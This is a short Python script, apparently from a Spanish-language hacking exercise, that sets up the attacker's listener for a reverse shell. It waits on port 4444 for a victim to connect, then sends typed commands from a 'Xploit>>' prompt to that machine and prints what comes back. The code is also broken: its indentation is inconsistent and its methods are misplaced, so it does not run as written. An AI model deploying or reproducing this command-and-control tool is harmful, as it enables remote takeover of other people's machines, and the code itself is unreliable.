import socket 

class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)
		print("[+] Esperando conexiones")
		self.connection, address = listener.accept()
		print("[+] tenemos conexiones de " + str(address))
def ejecutar_remoto(self,command):
 		self.connection.send(command)
 		return self.connection.recv(1024)
 		def run(self):
		  while True:
			  command = input("Xploit>>")
					#si estoy en python3 imput sin raw
			  result = self.ejecutar_remoto(command)
			  print(result)

escuchar = Listener("192.168.56.1", 4444)
escuchar.run()